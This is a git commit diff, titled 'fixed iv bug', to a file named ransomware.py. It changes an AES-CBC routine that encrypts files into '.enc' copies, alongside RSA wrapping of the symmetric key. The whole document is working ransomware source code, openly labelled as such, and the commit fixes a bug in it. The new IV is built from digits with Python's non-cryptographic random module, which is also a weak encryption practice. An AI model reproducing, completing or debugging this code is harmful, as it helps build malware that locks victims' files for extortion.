1e04b2fdeae36bfc53cddc70515c04f9315709b9
shrn82256 <shrn82256@gmail.com>
2019-03-26 23:47:11 +0530

    fixed iv bug

--- ransomware.py
+++ ransomware.py
@@ -1,6 +1,7 @@
 import os
 import sys
 import random
+import string
 import struct
 import zipfile
 from Crypto.PublicKey import RSA
@@ -51,19 +52,19 @@ def encrypt_symmetric_key(key):
 def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
     if not out_filename:
         out_filename = in_filename + '.enc'
-    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
+    iv = ''.join(random.choice(string.digits) for _ in range(16))
     encryptor = AES.new(key, AES.MODE_CBC, iv)
     filesize = os.path.getsize(in_filename)
     with open(in_filename, 'rb') as infile:
         with open(out_filename, 'wb') as outfile:
             outfile.write(struct.pack('<Q', filesize))
-            outfile.write(iv)
+            outfile.write(str.encode(iv))
             while True:
                 chunk = infile.read(chunksize)
                 if len(chunk) == 0:
                     break
                 elif len(chunk) % 16 != 0:
-                    chunk += ' ' * (16 - len(chunk) % 16)
+                    chunk += str.encode(' ' * (16 - len(chunk) % 16))
                 outfile.write(encryptor.encrypt(chunk))
 
 
